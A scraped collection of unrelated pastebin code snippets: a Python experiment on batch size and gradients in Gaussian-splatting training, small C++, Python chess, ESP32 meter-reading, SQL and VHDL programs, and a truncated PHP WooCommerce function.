            fill_subplot(ax[1], 'Batch size vs Grad Variance', np.arange(accum_steps),
                         variances[i][k],
                         'Batch size', 'Avg Parameter Variance', xscale='linear', legend_labels='iter ' + str(iter))
            fill_subplot(ax[2], 'Batch size vs Cosine Sim. with Full-Batch Grad', np.arange(accum_steps),
                         cosines[i][k],
                         'Batch size', 'Cosine Similarity', xscale='linear', legend_labels='iter ' + str(iter))
            # Ignore the last value because full-batch SNR is infinite
            fill_subplot(ax[3], 'Batch size vs grad SNR', np.arange(accum_steps)[:-10],
                         SNRs[i][k][:-10],
                         'Batch size', 'SNR', xscale='linear', legend_labels='iter ' + str(iter))
            # Ignore the last value because full-batch SNR is infinite
            fill_subplot(ax[4], 'Batch size vs grad NSR', np.arange(accum_steps)[:-10],
                         1 / SNRs[i][k][:-10],
                         'Batch size', 'NSR', xscale='linear', legend_labels='iter ' + str(iter))
        fig.suptitle(f'Scene: {scene_name}. Param group: {k.replace(""_"", """")}')
        fig.tight_layout()
        os.makedirs(os.path.join('plots', scene_name), exist_ok=True)
        fig.savefig(os.path.join('plots', scene_name,
                                 f'scene_{scene_name}_param_{k.replace(""_"", """")}_random_order_trials_{num_trials}_snr.png'))
        fig.show()
        plt.close(fig)


def backward_once(gaussians: GaussianModel, viewpoint_cam, opt, pipe, background):
    render_pkg = render(viewpoint_cam, gaussians, pipe, background)
    image, viewspace_point_tensor, visibility_filter, radii = render_pkg[""render""], render_pkg[
        ""viewspace_points""], \
        render_pkg[""visibility_filter""], render_pkg[""radii""]
    # Loss
    gt_image = viewpoint_cam.original_image
    Ll1 = l1_loss(image, gt_image)
    loss = (1.0 - opt.lambda_dssim) * Ll1 + opt.lambda_dssim * (1.0 - ssim(image, gt_image))
    loss.backward()
    return loss


def run_iterations(gaussians: GaussianModel, train_cameras, opt, camera_ids, batch_size, pipe, background,
                   discard_last=True):
    gaussians.optimizer.zero_grad(set_to_none=True)
    for i, camera_id in enumerate(camera_ids):
        backward_once(gaussians, train_cameras[camera_id], opt, pipe, background)

        # Update params every batch_size iterations
        if (i + 1) % batch_size == 0:
            gaussians.optimizer.step()
            gaussians.optimizer.zero_grad(set_to_none=True)
        elif not discard_last and i == len(camera_ids) - 1:
            gaussians.optimizer.step()
            gaussians.optimizer.zero_grad(set_to_none=True)
    gaussians.optimizer.zero_grad(set_to_none=True)
    return gaussians


def clear_adam_state(optimizer, bach_size, rescale_betas=True,
                     lr_scaling: Literal['constant', 'sqrt', 'linear'] = 'sqrt'):
    for group in optimizer.param_groups:
        # clear ADAM state
        if rescale_betas:
            group['betas'] = (group['betas'][0] ** bach_size, group['betas'][1] ** bach_size)
        for p in group['params']:
            state = optimizer.state[p]
            state['exp_avg'] *= 0
            state['exp_avg_sq'] *= 0
            state['step'] *= 0
        if lr_scaling == 'constant':
            coeff = 1
        elif lr_scaling == 'sqrt':
            coeff = float(bach_size) ** 0.5
        elif lr_scaling == 'linear':
            coeff = float(bach_size)
        else:
            raise ValueError(f'Unknown lr_scaling {lr_scaling}')
        group['lr'] *= coeff


def plot_batch_size_vs_weights_delta_similarity(dataset, opt, train_cameras, background, pipe, checkpoint_path, keys,
                                                num_trials=32,
                                                checkpoints_list=[15000, 30000],
                                                batch_sizes=[1, 4, 16, 64], warmup_epochs=1, run_epochs=5,
                                                rescale_betas=True,
                                                lr_scaling: Literal['constant', 'sqrt', 'linear'] = 'sqrt'):
    random.seed()
    cosines_for_checkpoint = []
    norms_for_checkpoint = []
    losses_for_checkpoint = []
    param_index_map = {'_xyz': 1, '_features_dc': 2, '_features_rest': 3, '_scaling': 4, '_rotation': 5, '_opacity': 6}

    for checkpoint_itr in checkpoints_list:
        cosines: Dict[str, List[Dict[int, float]]] = {k: [{} for _ in range(len(batch_sizes))] for k in keys}
        norms: Dict[str, List[Dict[int, float]]] = {k: [{} for _ in range(len(batch_sizes))] for k in keys}
        losses: List[Dict[int, float]] = [defaultdict(float) for _ in range(len(batch_sizes))]
        chpt = checkpoint_path.rstrip("".pth"").split(""chkpnt"")[1]
        cur_checkpoint = checkpoint_path.replace(""chkpnt"" + str(chpt), ""chkpnt"" + str(checkpoint_itr))
        print('loading checkpoint ', cur_checkpoint)
        (model_params, first_iter) = torch.load(cur_checkpoint)

        # original_gaussians = restored_gaussians(model_params, opt)
        original_params = {k: model_params[param_index_map[k]] for k in keys}
        camera_idx = np.concatenate(
            [np.random.permutation(np.arange(len(train_cameras))) for _ in range(warmup_epochs + run_epochs)])

        for batch_size in batch_sizes:
            if batch_size == 1:
                continue
            print('Running for batch size', batch_size)
            temp_batch_sizes = [1, batch_size]
            running_gaussians = [restored_gaussians(model_params, dataset, opt, deepcopy=True) for _ in
                                 temp_batch_sizes]
            # Readjust ADAM parameters for batch size > 1
            for i in range(len(temp_batch_sizes)):
                clear_adam_state(running_gaussians[i].optimizer, temp_batch_sizes[i], rescale_betas=rescale_betas,
                                 lr_scaling=lr_scaling)
                # warmup new ADAM state
                run_iterations(running_gaussians[i], train_cameras, opt,
                               camera_idx[:len(train_cameras) * warmup_epochs], temp_batch_sizes[i], pipe, background,
                               discard_last=True)
                running_gaussians[i].restore_parameters(model_params, opt)

            for i, camera_id in enumerate(tqdm(camera_idx[len(train_cameras) * warmup_epochs:])):
                for j, temp_batch_size in enumerate(temp_batch_sizes):
                    running_gaussian = running_gaussians[j]
                    loss = backward_once(running_gaussian, train_cameras[camera_id], opt, pipe, background)

                    # average gradients from views
                    next_accum_step = min(len(camera_idx), (i // temp_batch_size + 1) * temp_batch_size)
                    last_accum_step = (i // temp_batch_size) * temp_batch_size
                    # loss /= min(temp_batch_size, len(train_cameras) - last_accum_step)
                    # loss /= temp_batch_size

                    # print('batch size ', temp_batch_size, 'next accum step', next_accum_step, 'divider', min(temp_batch_size, len(train_cameras) - last_accum_step))
                    if temp_batch_size == 1:
                        losses[batch_sizes.index(temp_batch_size)][next_accum_step] = float(
                            loss.item()) / temp_batch_size
                    else:
                        losses[batch_sizes.index(temp_batch_size)][next_accum_step] += float(
                            loss.item()) / temp_batch_size
                    # Update params every batch_size iterations
                    # if (i + 1) % temp_batch_size == 0 or i == len(camera_idx) - 1:
                    if (i + 1) % temp_batch_size == 0:
                        running_gaussian.optimizer.step()
                        running_gaussian.optimizer.zero_grad(set_to_none=True)
                        for k in keys:
                            # compare weight delta from batch-size 1 and that from the current batch-size
                            weight_delta = getattr(running_gaussian, k).detach() - original_params[k]
                            norms[k][batch_sizes.index(temp_batch_size)][i + 1] = float(torch.linalg.norm(weight_delta))
                            if temp_batch_size != 1:
                                reference_weight_delta = getattr(running_gaussians[0], k).detach() - original_params[k]
                                cosines[k][batch_sizes.index(temp_batch_size)][i + 1] = float(
                                    torch.nn.functional.cosine_similarity(reference_weight_delta.flatten(),
                                                                          weight_delta.flatten(), dim=0))
            del running_gaussians, running_gaussian, weight_delta, reference_weight_delta, loss
        cosines_for_checkpoint.append(cosines)
        losses_for_checkpoint.append(losses)
        norms_for_checkpoint.append(norms)
        del model_params, first_iter, original_params
    pprint.pp(losses_for_checkpoint)
    pprint.pp(norms_for_checkpoint)
    pprint.pp(cosines_for_checkpoint)
    return cosines_for_checkpoint, losses_for_checkpoint, norms_for_checkpoint


def plot(cosines, losses, norms, keys, checkpoint_iter, batch_sizes, rescale_betas: bool, lr_scaling: str, warmup_epochs: int):
    scene_name = os.path.basename(args.source_path)
    for k in keys:
        fig, ax = plt.subplots(1, 3, figsize=(6 * 3, 6), dpi=200)
        fill_subplot(ax[0], 'Batch size vs cosine(weight delta w.r.t bs=1)',
                     [list(cosines[k][j].keys()) for j in range(len(batch_sizes))],
                     [list(cosines[k][j].values()) for j in range(len(batch_sizes))],
                     'Iterations', 'Cosine Sim', xscale='linear', legend_labels=[f'BS {b}' for b in batch_sizes])
        fill_subplot(ax[1], 'Batch size vs Loss',
                     [list(losses[j].keys()) for j in range(len(batch_sizes))],
                     [list(losses[j].values()) for j in range(len(batch_sizes))],
                     'Iterations', 'loss', xscale='linear', legend_labels=[f'BS {b}' for b in batch_sizes])
        fill_subplot(ax[2], 'Batch size vs norm(weight delta)',
                     [list(norms[k][j].keys()) for j in range(len(batch_sizes))],
                     [list(norms[k][j].values()) for j in range(len(batch_sizes))],
                     'Iterations', 'norm', xscale='linear', legend_labels=[f'BS {b}' for b in batch_sizes])

        fig.suptitle(f'Scene: {scene_name}. Checkpoint {checkpoint_iter}. Rescale betas: {rescale_betas}. LR scaling: {lr_scaling}. Warmup: {warmup_epochs} epochs. Params: {k}')
        fig.tight_layout()
        os.makedirs(os.path.join('plots_grad_delta', scene_name), exist_ok=True)
        fig.savefig(os.path.join('plots_grad_delta', scene_name,
                                 f'scene_{scene_name}_checkpoint_{checkpoint_iter}_param_{k.replace(""_"", """")}_rescale_betas_{rescale_betas}_lr_{lr_scaling}_warmup_{warmup_epochs}.png'))
        if k == '_xyz':
            fig.show()
        plt.close(fig)


def training(dataset, opt, pipe, testing_iterations, saving_iterations, checkpoint_iterations, checkpoint, debug_from):
    first_iter = 0
    tb_writer = prepare_output_and_logger(dataset)
    scene = Scene(dataset, None)
    # if checkpoint:
    #     (model_params, first_iter) = torch.load(checkpoint)
    #     gaussians.restore(model_params, opt)

    bg_color = [1, 1, 1] if dataset.white_background else [0, 0, 0]
    background = torch.tensor(bg_color, dtype=torch.float32, device=""cuda"")

    iter_start = torch.cuda.Event(enable_timing=True)
    iter_end = torch.cuda.Event(enable_timing=True)

    viewpoint_stack = None
    ema_loss_for_log = 0.0
    progress_bar = tqdm(range(first_iter, opt.iterations), desc=""Training progress"")
    first_iter += 1

    random.seed()
    n_epochs = 0
    keys = ['_xyz', '_rotation', '_scaling', '_opacity', '_features_dc']
    num_views = len(scene.getTrainCameras())
    train_cameras = scene.getTrainCameras()
    # plot_variance_sparsity_cosine(dataset, opt, train_cameras, background, pipe, checkpoint, keys, num_trials=4)
    del scene
    checkpoints_list = [15000, 30000]
    run_epochs = 4
    warmup_epochs = 1
    batch_sizes = [1, 4, 8, 16, 32, 64]
    # batch_sizes = [1, 4]
    for lr_scaling in ['sqrt', 'constant', 'linear']:
        for rescale_betas in [True, False]:
            cosines_checkpoint, losses_checkpoint, norms_checkpoint = plot_batch_size_vs_weights_delta_similarity(
                dataset, opt, train_cameras, background, pipe, checkpoint, keys,
                checkpoints_list=checkpoints_list, batch_sizes=batch_sizes, run_epochs=run_epochs, warmup_epochs=warmup_epochs, rescale_betas=rescale_betas,
                lr_scaling='sqrt')
            for i in range(len(checkpoints_list)):
                plot(cosines_checkpoint[i], losses_checkpoint[i], norms_checkpoint[i], keys, checkpoints_list[i],
                     batch_sizes, rescale_betas, lr_scaling, warmup_epochs)
    for warmup_epochs in [0, 1, 2]:
        lr_scaling = 'sqrt'
        rescale_betas = True
        cosines_checkpoint, losses_checkpoint, norms_checkpoint = plot_batch_size_vs_weights_delta_similarity(
            dataset, opt, train_cameras, background, pipe, checkpoint, keys,
            checkpoints_list=checkpoints_list, batch_sizes=batch_sizes, run_epochs=run_epochs, warmup_epochs=warmup_epochs,
            rescale_betas=rescale_betas,
            lr_scaling='sqrt')
        for i in range(len(checkpoints_list)):
            plot(cosines_checkpoint[i], losses_checkpoint[i], norms_checkpoint[i], keys, checkpoints_list[i],
                 batch_sizes, rescale_betas, lr_scaling, warmup_epochs)
    quit()

    for iteration in range(first_iter, opt.iterations + 1):
        if network_gui.conn == None:
            network_gui.try_connect()
        while network_gui.conn != None:
            try:
                net_image_bytes = None
                custom_cam, do_training, pipe.convert_SHs_python, pipe.compute_cov3D_python, keep_alive, scaling_modifer = network_gui.receive()
                if custom_cam != None:
                    net_image = render(custom_cam, gaussians, pipe, background, scaling_modifer)[""render""]
                    net_image_bytes = memoryview((torch.clamp(net_image, min=0, max=1.0) * 255).byte().permute(1, 2,
                                                                                                               0).contiguous().cpu().numpy())
                network_gui.send(net_image_bytes, dataset.source_path)
                if do_training and ((iteration < int(opt.iterations)) or not keep_alive):
                    break
            except Exception as e:
                network_gui.conn = None

        iter_start.record()

        gaussians.update_learning_rate(iteration)

        # Every 1000 its we increase the levels of SH up to a maximum degree
        if iteration % 1000 == 0:
            gaussians.oneupSHdegree()

        # Pick a random Camera
        if not viewpoint_stack:
            viewpoint_stack = scene.getTrainCameras().copy()
            epoch_change = True
            n_epochs += 1
        else:
            epoch_change = False
        viewpoint_cam = viewpoint_stack.pop(randint(0, len(viewpoint_stack) - 1))

        if epoch_change and False:
            print('epoch ', n_epochs)

        # Render
        if (iteration - 1) == debug_from:
            pipe.debug = True

        bg = torch.rand((3), device=""cuda"") if opt.random_background else background

        render_pkg = render(viewpoint_cam, gaussians, pipe, bg)
        image, viewspace_point_tensor, visibility_filter, radii = render_pkg[""render""], render_pkg[""viewspace_points""], \
            render_pkg[""visibility_filter""], render_pkg[""radii""]

        # Loss
        gt_image = viewpoint_cam.original_image.cuda()
        Ll1 = l1_loss(image, gt_image)
        loss = (1.0 - opt.lambda_dssim) * Ll1 + opt.lambda_dssim * (1.0 - ssim(image, gt_image))
        loss.backward()

        iter_end.record()

        with torch.no_grad():
            # Progress bar
            ema_loss_for_log = 0.4 * loss.item() + 0.6 * ema_loss_for_log
            if iteration % 10 == 0:
                progress_bar.set_postfix({""Loss"": f""{ema_loss_for_log:.{7}f}""})
                progress_bar.update(10)
            if iteration == opt.iterations:
                progress_bar.close()

            # Log and save
            # training_report(tb_writer, iteration, Ll1, loss, l1_loss, iter_start.elapsed_time(iter_end),
            #                 testing_iterations, scene, render, (pipe, background))
            # if (iteration in saving_iterations):
            #     print(""\n[ITER {}] Saving Gaussians"".format(iteration))
            #     scene.save(iteration)

            # # Densification
            # if iteration < opt.densify_until_iter:
            #     # Keep track of max radii in image-space for pruning
            #     gaussians.max_radii2D[visibility_filter] = torch.max(gaussians.max_radii2D[visibility_filter],
            #                                                          radii[visibility_filter])
            #     gaussians.add_densification_stats(viewspace_point_tensor, visibility_filter)
            #
            #     if iteration > opt.densify_from_iter and iteration % opt.densification_interval == 0:
            #         size_threshold = 20 if iteration > opt.opacity_reset_interval else None
            #         gaussians.densify_and_prune(opt.densify_grad_threshold, 0.005, scene.cameras_extent, size_threshold)
            #
            #     if iteration % opt.opacity_reset_interval == 0 or (
            #             dataset.white_background and iteration == opt.densify_from_iter):
            #         gaussians.reset_opacity()

            # Optimizer step
            if iteration < opt.iterations:
                gaussians.optimizer.step()
                gaussians.optimizer.zero_grad(set_to_none=True)

            # if (iteration in checkpoint_iterations):
            #     print(""\n[ITER {}] Saving Checkpoint"".format(iteration))
            #     torch.save((gaussians.capture(), iteration), scene.model_path + ""/chkpnt"" + str(iteration) + "".pth"")


def prepare_output_and_logger(args):
    if not args.model_path:
        if os.getenv('OAR_JOB_ID'):
            unique_str = os.getenv('OAR_JOB_ID')
        else:
            unique_str = str(uuid.uuid4())
        args.model_path = os.path.join(""/tmp/sparsity-output/"", unique_str[0:10])

    # Set up output folder
    print(""Output folder: {}"".format(args.model_path))
    os.makedirs(args.model_path, exist_ok=True)
    with open(os.path.join(args.model_path, ""cfg_args""), 'w') as cfg_log_f:
        cfg_log_f.write(str(Namespace(**vars(args))))

    # Create Tensorboard writer
    tb_writer = None
    if TENSORBOARD_FOUND:
        tb_writer = SummaryWriter(args.model_path)
    else:
        print(""Tensorboard not available: not logging progress"")
    return tb_writer


def training_report(tb_writer, iteration, Ll1, loss, l1_loss, elapsed, testing_iterations, scene: Scene, renderFunc,
                    renderArgs):
    if tb_writer:
        tb_writer.add_scalar('train_loss_patches/l1_loss', Ll1.item(), iteration)
        tb_writer.add_scalar('train_loss_patches/total_loss', loss.item(), iteration)
        tb_writer.add_scalar('iter_time', elapsed, iteration)

    # Report test and samples of training set
    if iteration in testing_iterations:
        torch.cuda.empty_cache()
        validation_configs = ({'name': 'test', 'cameras': scene.getTestCameras()},
                              {'name': 'train',
                               'cameras': [scene.getTrainCameras()[idx % len(scene.getTrainCameras())] for idx in
                                           range(5, 30, 5)]})

        for config in validation_configs:
            if config['cameras'] and len(config['cameras']) > 0:
                l1_test = 0.0
                psnr_test = 0.0
                for idx, viewpoint in enumerate(config['cameras']):
                    image = torch.clamp(renderFunc(viewpoint, scene.gaussians, *renderArgs)[""render""], 0.0, 1.0)
                    gt_image = torch.clamp(viewpoint.original_image.to(""cuda""), 0.0, 1.0)
                    if tb_writer and (idx < 5):
                        tb_writer.add_images(config['name'] + ""_view_{}/render"".format(viewpoint.image_name),
                                             image[None], global_step=iteration)
                        if iteration == testing_iterations[0]:
                            tb_writer.add_images(config['name'] + ""_view_{}/ground_truth"".format(viewpoint.image_name),
                                                 gt_image[None], global_step=iteration)
                    l1_test += l1_loss(image, gt_image).mean().double()
                    psnr_test += psnr(image, gt_image).mean().double()
                psnr_test /= len(config['cameras'])
                l1_test /= len(config['cameras'])
                print(""\n[ITER {}] Evaluating {}: L1 {} PSNR {}"".format(iteration, config['name'], l1_test, psnr_test))
                if tb_writer:
                    tb_writer.add_scalar(config['name'] + '/loss_viewpoint - l1_loss', l1_test, iteration)
                    tb_writer.add_scalar(config['name'] + '/loss_viewpoint - psnr', psnr_test, iteration)

        if tb_writer:
            tb_writer.add_histogram(""scene/opacity_histogram"", scene.gaussians.get_opacity, iteration)
            tb_writer.add_scalar('total_points', scene.gaussians.get_xyz.shape[0], iteration)
        torch.cuda.empty_cache()


if __name__ == ""__main__"":
    # Set up command line argument parser
    parser = ArgumentParser(description=""Training script parameters"")
    lp = ModelParams(parser)
    op = OptimizationParams(parser)
    pp = PipelineParams(parser)
    save_iters = [0, 1_000, 4_500, 7_000, 11_000, 15_000, 18_000, 21_000, 24_000, 27_000, 30_000]
    parser.add_argument('--ip', type=str, default=""127.0.0.1"")
    parser.add_argument('--port', type=int, default=6009)
    parser.add_argument('--debug_from', type=int, default=-1)
    parser.add_argument('--detect_anomaly', action='store_true', default=False)
    parser.add_argument(""--test_iterations"", nargs=""+"", type=int, default=save_iters)
    parser.add_argument(""--save_iterations"", nargs=""+"", type=int, default=save_iters)
    parser.add_argument(""--quiet"", action=""store_true"")
    parser.add_argument(""--checkpoint_iterations"", nargs=""+"", type=int, default=save_iters)
    parser.add_argument(""--start_checkpoint"", type=str, default=None)
    args = parser.parse_args(sys.argv[1:])
    args.save_iterations.append(args.iterations)

    print(""Optimizing "" + args.model_path)

    # Initialize system state (RNG)
    safe_state(args.quiet)

    # Start GUI server, configure and run training
    # network_gui.init(args.ip, args.port)
    torch.autograd.set_detect_anomaly(args.detect_anomaly)
    training(lp.extract(args), op.extract(args), pp.extract(args), args.test_iterations, args.save_iterations,
             args.checkpoint_iterations, args.start_checkpoint, args.debug_from)

    # All done
    print(""\nTraining complete."")"
rn581Cgv,ejer1_tp5,orlandoju,C++,Monday 13th of May 2024 04:25:52 AM CDT,"    #include <iostream>
    #include <clocale>
    using namespace std;

    /*Hacer una funci√≥n que reciba como par√°metro dos n√∫meros enteros y devuelva verdadero si el primero de ellos es m√∫ltiplo del segundo. Caso contrario debe devolver falso.*/


    bool esMultiplo(int x, int y);
    int main(){
        setlocale(LC_ALL,"""");
        int n,m= 0;
        cout<<""Ingrese dos n√∫meros para saber si son multiplos entre el primero por el segundo: "" <<endl;
        cin>> n;
        cout<<endl;
        cin>> m;
        cout<<endl;
        bool multiplo = esMultiplo(n,m);
        if(multiplo ){
            cout<<""Los n√∫meros son multiplos entre s√≠""<<endl;
        }
        else{
          cout<<""Los n√∫meros no son multiplos entre s√≠""<<endl;
        }

    return 0;
    }
    bool esMultiplo(int x, int y) {
    if (y == 0) return false;  // Evitar divisi√≥n por cero
    return (x % y == 0);
    }
"
akkALYXR,ok 993,max2201111,Python,Monday 13th of May 2024 04:01:34 AM CDT,"import chess

# Inicializujte glob√°ln√≠ promƒõnnou P s v√Ωchoz√≠ hodnotou, kter√° umo≈æn√≠ spu≈°tƒõn√≠ minimax funkce
P = None

def evaluate_board(board, depth):
    if board.is_checkmate():
        return 1000 - depth if not board.turn else -1000 + depth
    elif board.is_stalemate() or board.is_insufficient_material() or board.can_claim_draw():
        return 0
    return 4  # Default heuristic for non-terminal positions

def minimax(board, depth, alpha, beta, maximizing_player, node_count, completed_depths):
    global P  # Deklarujte P jako glob√°ln√≠ promƒõnnou
    node_count[0] += 1
    if node_count[0] % 1000000 == 0:
        print(f""Nodes explored: {node_count[0]}"")

    if board.is_game_over():
        if depth not in completed_depths:
            print(f""Depth {depth} completed for the first time."")
            completed_depths.add(depth)
        return [], evaluate_board(board, depth)

    if depth > 9:
        if depth not in completed_depths:
            print(f""Depth {depth} completed for the first time."")
            completed_depths.add(depth)
        return [], evaluate_board(board, depth)

    best_eval = float('-inf') if maximizing_player else float('inf')
    best_sequence = []

    for move in board.legal_moves:
        board.push(move)
        sequence, eval = minimax(board, depth + 1, alpha, beta, not maximizing_player, node_count, completed_depths)
        board.pop()

        if maximizing_player:
            if eval > best_eval:
                best_eval = eval
                best_sequence = [board.san(move)] + sequence
            alpha = max(alpha, eval)
            if beta <= alpha:
                break
        else:
            if eval < best_eval:
                best_eval = eval
                best_sequence = [board.san(move)] + sequence
            beta = min(beta, eval)
            if beta <= alpha:
                break

        # P≈ôi≈ôaƒète hodnotu evaluace P, kontrola m≈Ø≈æe b√Ωt tady
        P = eval

    if depth not in completed_depths:
        print(f""Depth {depth} completed for the first time."")
        completed_depths.add(depth)

    return best_sequence, best_eval

# Nastavte P na poƒç√°teƒçn√≠ hodnotu, kter√° umo≈æ≈àuje prvn√≠ spu≈°tƒõn√≠
P = 5

# Testov√°n√≠ funkce minimax
board = chess.Board(""8/6k1/8/2Q5/4K3/8/8/8 w - - 0 1"")
node_count = [0]
completed_depths = set()
sequence, evaluation = minimax(board, 0, float('-inf'), float('inf'), True, node_count, completed_depths)
print(f""Best sequence: {sequence}, Evaluation: {evaluation}"")
"
VVfX0JLw,IdeaSpark ESP32 - Digitale stroomteller uitlezen (Project with custom PCB),jgoy,C++,Monday 13th of May 2024 03:18:06 AM CDT,"/* A custom PCB is needed for this sketch */

#include <Adafruit_SSD1306.h>  // https://github.com/adafruit/Adafruit_SSD1306
#include <Fonts/FreeSans9pt7b.h>
#include <Fonts/FreeSansBold18pt7b.h>
#include <HardwareSerial.h>

HardwareSerial mySerial(2);  // gebruik UART2
Adafruit_SSD1306 oled(128, 64, &Wire, -1);

String myString, tempString, resultaat;

uint8_t SCREEN_ORIENTATION = 2;

void setup() {
  Serial.begin(115200);
  mySerial.begin(115200, SERIAL_8N1, 4, -1, true); 
  oled.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  oled.setRotation(SCREEN_ORIENTATION);
  oled.setTextColor(1);  // white = 1, black = 0
  oled.clearDisplay();
  oled.display();
  delay(1000);
}

void loop() {
  if (mySerial.available()) {
    myString = mySerial.readStringUntil('\n');
    if (myString.indexOf(""1-0:1.7.0"") >= 0) { 
      Serial.println(myString);
      toonGegevens();
    }
  }
}

void verwerkDeelString() {
  tempString = myString;
  int index1 = tempString.indexOf(""1-0:1.7.0"");
  resultaat = tempString.substring(index1 + 10, index1 + 19);
  resultaat.replace(""*"", "" "");
  resultaat.trim();
}

void toonGegevens() {
  verwerkDeelString();
  oled.clearDisplay();
  oled.setCursor(0, 12);
  oled.setFont(&FreeSans9pt7b);
  oled.println(""Digitale meter"");
  oled.println(""huidig verbruik:"");
  oled.setCursor(0, 60);
  oled.print(resultaat);
  oled.display();
}"
nZcw795v,Untitled,ruchej,PostgreSQL,Monday 13th of May 2024 03:04:26 AM CDT,"SELECT
	PUBLIC.OPTIMAL_LIMITS_D.MIN_LIMIT AS MIN_LIMIT,
	PUBLIC.OPTIMAL_LIMITS_D.MAX_LIMIT AS MAX_LIMIT,
	PUBLIC.OPTIMAL_LIMITS_D.INDICATOR_ID AS INDICATOR_ID,
	PUBLIC.SP_PV_MAPPING.SP_INDICATOR_ID
FROM
	PUBLIC.OPTIMAL_LIMITS_D,
	(
		SELECT
			PUBLIC.TECHNOLOGICAL_MODES_D.MODE_ID AS MODE_ID
		FROM
			PUBLIC.TECHNOLOGICAL_MODES_D
		WHERE
			PUBLIC.TECHNOLOGICAL_MODES_D.DT = (
				SELECT
					MAX(PUBLIC.TECHNOLOGICAL_MODES_D.DT) AS MAX_2
				FROM
					PUBLIC.TECHNOLOGICAL_MODES_D
				WHERE
					PUBLIC.TECHNOLOGICAL_MODES_D.DT <= '2024-05-13 00:00'
			)
			AND PUBLIC.TECHNOLOGICAL_MODES_D.SECTION_ID = 7
	) AS ANON_8
LEFT JOIN PUBLIC.SP_PV_MAPPING ON PUBLIC.SP_PV_MAPPING.PV_INDICATOR_ID = PUBLIC.OPTIMAL_LIMITS_D.INDICATOR_ID
WHERE
	PUBLIC.OPTIMAL_LIMITS_D.INSERT_DT = (
		SELECT
			MAX(PUBLIC.OPTIMAL_LIMITS_D.INSERT_DT) AS MAX_3
		FROM
			PUBLIC.OPTIMAL_LIMITS_D
		WHERE
			PUBLIC.OPTIMAL_LIMITS_D.INSERT_DT <= '2024-05-13 00:00'
	)
	AND PUBLIC.OPTIMAL_LIMITS_D.MODE_ID = ANON_8.MODE_ID
	AND PUBLIC.OPTIMAL_LIMITS_D.SECTION_ID = 7
ORDER BY
	INDICATOR_ID DESC"
WB0kEARN,blatt1_2aufgabe,madegoff,VHDL,Monday 13th of May 2024 02:59:36 AM CDT,"library ieee;
use ieee.std_logic_1164.all;
use ieee.numeric_std.all;

library work;
use work.ArmTypes.INSTRUCTION_ID_WIDTH;
use work.ArmTypes.VCR_RESET;

entity ArmInstructionAddressRegister is
	port(
		IAR_CLK 	: in std_logic;
		IAR_RST 	: in std_logic;
		IAR_INC		: in std_logic;
		IAR_LOAD 	: in std_logic;
		IAR_REVOKE	: in std_logic;
		IAR_UPDATE_HB	: in std_logic;
--------------------------------------------------------------------------------
--	INSTRUCTION_ID_WIDTH  ist ein globaler Konfigurationsparameter
--	zur Einstellung der Breite der Instruktions-IDs und damit der Tiefe
--	der verteilten Puffer. Eine Breite von 3 Bit genuegt fuer die 
--	fuenfstufige Pipeline definitiv.
--------------------------------------------------------------------------------
		IAR_HISTORY_ID	: in std_logic_vector(INSTRUCTION_ID_WIDTH-1 downto 0);
		IAR_ADDR_IN 	: in std_logic_vector(31 downto 2);
		IAR_ADDR_OUT 	: out std_logic_vector(31 downto 2);
		IAR_NEXT_ADDR_OUT : out std_logic_vector(31 downto 2)
	    );
	
end entity ArmInstructionAddressRegister;

architecture behave of ArmInstructionAddressRegister is

	component ArmRamBuffer
	generic(
		ARB_ADDR_WIDTH : natural range 1 to 4 := 3;
		ARB_DATA_WIDTH : natural range 1 to 64 := 32
	       );
	port(
		ARB_CLK 	: in std_logic;
		ARB_WRITE_EN	: in std_logic;
		ARB_ADDR	: in std_logic_vector(ARB_ADDR_WIDTH-1 downto 0);
		ARB_DATA_IN	: in std_logic_vector(ARB_DATA_WIDTH-1 downto 0);          
		ARB_DATA_OUT	: out std_logic_vector(ARB_DATA_WIDTH-1 downto 0)
		);
	end component ArmRamBuffer;

signal mux1_out : std_logic_vector(31 downto 2) := (others => '0');
signal mux2_out : std_logic_vector(31 downto 2) := (others => '0');
signal register_out : std_logic_vector(31 downto 2);
signal buffer_out : std_logic_vector(31 downto 2) := (others => '0');

begin

	reg : process(IAR_CLK) is
   	begin
    	if (rising_edge(IAR_CLK)) then
    	   if IAR_RST = '1' then
    	       register_out <= (others => '0');
    	   else
      	       register_out <= mux2_out;
           end if;
      	end if;
	end process reg;
	
    with IAR_INC select --erster MUX
       mux1_out <= std_logic_vector(4 + unsigned(register_out)) when '1',
                   register_out when others;
                      
    with IAR_LOAD select --zweiter MUX
       mux2_out <= IAR_ADDR_IN when '1',
                   mux1_out when others;
                      
    with IAR_REVOKE select --dritter MUX
       IAR_NEXT_ADDR_OUT <= buffer_out when '1',
                            std_logic_vector(4 + unsigned(register_out)) when others;
        
    IAR_ADDR_OUT <= register_out;

	IAR_HISTORY_BUFFER: ArmRamBuffer 
	generic map(
			ARB_ADDR_WIDTH => INSTRUCTION_ID_WIDTH,
			ARB_DATA_WIDTH => 30
		)
	port map(
		ARB_CLK		=> IAR_CLK,
		ARB_WRITE_EN	=> IAR_UPDATE_HB,
		ARB_ADDR	=> IAR_HISTORY_ID,
		ARB_DATA_IN	=> register_out,
		ARB_DATA_OUT	=> buffer_out
	);

end architecture behave;
"
wF5HMfQB,Untitled,nshelper,PHP,Monday 13th of May 2024 02:37:52 AM CDT,"public static function get_order_summary($order){
		$cart = array();
		$cart['products']   = array();
		$cart['categories'] = array();
		$cart['tags'] 		= array();
		$cart['variations'] = array();
		$cart['shipping_class'] = array();
		$cart['product_type'] = array();
		$shipping_weight = 0;

		if($order){
			$items = $order->get_items();
			$order_total = $order->get_total();
			$order_subtotal = $order->get_subtotal();
			foreach($items as $item) {
                do_action( 'woocommerce/cart_loop/start', $item );
				$product_id = $item->get_product_id();
				if(!$product_id){
					continue;
				}

				$cart['products'][] = self::get_original_product_id($product_id);
				$cart['categories'] = array_merge( $cart['categories'], self::get_product_categories($product_id) );
				$cart['tags']       = array_merge( $cart['tags'], self::get_product_tags($product_id) );
				$cart['shipping_class'] = array_merge($cart['shipping_class'] ,self::get_product_shipping_class($product_id));
				$cart['product_type'][] = WC_Product_Factory::get_product_type($product_id);

				if($item->get_variation_id()){
					$cart['variations'][] = $item->get_variation_id();
					$cart['products'][] = self::get_original_product_id($item->get_variation_id());
				}
				$product_qty = $item->get_quantity();
				$_product = wc_get_product( $product_id );
				$weight = $_product->get_weight();
				if(!empty($weight) && is_numeric($weight)){
					$shipping_weight += $weight * $product_qty;
				}
                do_action( 'woocommerce/cart_loop/end', $item );
			}

			$cart['products']   = array_values($cart['products']);
